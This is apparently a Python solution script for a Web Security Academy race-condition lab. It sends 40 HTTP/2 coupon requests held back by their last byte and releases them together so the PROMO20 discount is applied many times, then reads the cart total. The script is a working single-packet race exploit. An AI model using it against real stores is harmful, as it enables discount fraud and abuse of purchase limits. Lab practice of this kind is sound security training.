from web_security_academy.core.async_lab_session import AsyncLabSession
from web_security_academy.core.logger import logger

from urllib.parse import urljoin
from requests import Request

import socket
import h2.connection
import time
import certifi
import ssl
import re

from bs4 import BeautifulSoup


def solve_lab(session):
    session.login("wiener", "peter")
    data = {"productId": "1", "quantity": "1", "redir": "PRODUCT"}
    resp = session.post_path("/cart", data=data)
    logger.info('Add a "Lightweight l33t leather jacket" to cart.')

    csrf = session.get_csrf_token("/cart")
    data = {"csrf": csrf, "coupon": "PROMO20"}

    req = Request("POST", urljoin(session.url, "/cart/coupon"), data=data)
    prepped = session.prepare_request(req)

    # print(prepped.method)  # :method
    # print(prepped.url)  # :scheme, :path, :host
    # print(prepped.headers)
    # print(prepped.body)

    ctx = ssl.create_default_context(cafile=certifi.where())
    ctx.set_alpn_protocols(["h2"])

    s = socket.create_connection(
        ("0a8000f6030cf6a0811b4d08002900a6.web-security-academy.net", 443)
    )
    s = ctx.wrap_socket(
        s, server_hostname="0a8000f6030cf6a0811b4d08002900a6.web-security-academy.net"
    )
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 0)

    c = h2.connection.H2Connection()
    c.initiate_connection()
    s.sendall(c.data_to_send())

    headers = [
        (":method", prepped.method),
        (":path", "/cart/coupon"),
        (":authority", "0a8000f6030cf6a0811b4d08002900a6.web-security-academy.net"),
        (":scheme", "http"),
    ] + list(prepped.headers.items())

    num_requests = 40
    stream_ids = []
    for i in range(num_requests):
        stream_ids.append(c.get_next_available_stream_id())
        c.send_headers(stream_ids[i], headers)
        c.send_data(stream_ids[i], prepped.body[:-1].encode())
        asdf = c.data_to_send()
        s.sendall(asdf)

    data = s.recv(65535)
    c.receive_data(data)

    time.sleep(0.1)
    c.send_headers(
        c.get_next_available_stream_id(),
        [
            (":method", "GET"),
            (":path", "/"),
            (
                ":authority",
                "0a8000f6030cf6a0811b4d08002900a6.web-security-academy.net",
            ),
            (":scheme", "http"),
        ],
        end_stream=True,
    )
    s.sendall(c.data_to_send())

    packet = b""
    for i in range(num_requests):
        c.send_data(stream_ids[i], prepped.body[-1].encode(), end_stream=True)

    s.sendall(c.data_to_send())
    data = s.recv(65535)
    # Necessary
    c.receive_data(data)

    print(session.cookies.get_dict())

    resp = session.get_path("/cart")
    soup = BeautifulSoup(resp.text, "lxml")
    query = soup.find("th", text=re.compile(r"^\$"))
    print(query.text)
